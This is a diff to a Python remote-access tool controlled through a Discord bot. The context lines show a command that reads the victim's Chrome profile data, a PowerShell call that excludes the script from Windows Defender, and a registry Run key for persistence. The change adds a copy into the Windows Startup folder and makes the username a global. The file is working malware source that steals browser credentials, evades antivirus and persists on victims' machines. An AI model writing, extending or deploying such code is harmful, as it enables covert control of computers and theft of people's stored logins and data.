@@ -38,7 +38,7 @@ ELEVATION_CONFIG_PATH = Path(os.getenv('ProgramData')) / 'osslik.json'
 ELEVATION_SERVICE_PORT = 58473
 ACTIVE_PROCESSES: Dict[str, subprocess.Popen] = {}
 WORKING_FILE = __file__
-
+USERNAME = os.getenv('USERNAME')
 
 class LASTINPUTINFO(Structure):
     _fields_ = [
@@ -644,8 +644,7 @@ async def get_chrome_data(interaction: discord.Interaction):
     try:
         await interaction.response.defer()
 
-        username = os.getenv('USERNAME')
-        chrome_path = Path(f"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default")
+        chrome_path = Path(f"C:\\Users\\{USERNAME}\\AppData\\Local\\Google\\Chrome\\User Data\\Default")
 
         if not chrome_path.exists():
             await interaction.followup.send("❌ Directory not found")
@@ -717,5 +716,6 @@ elevation_thread.start()
 # Add Defender exclusion
 asyncio.run(execute_elevated(f"powershell -Command \"Add-MpPreference -ExclusionPath \'{WORKING_FILE}\'\""))
 asyncio.run(execute_elevated(f"reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MyProgram\" /t REG_SZ /d \"{WORKING_FILE}\" /f"))
+asyncio.run(execute_elevated(f"copy {WORKING_FILE} \"C:\\Users\\{USERNAME}\\Appdata\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\""))
 
 client.run(BOT_TOKEN)
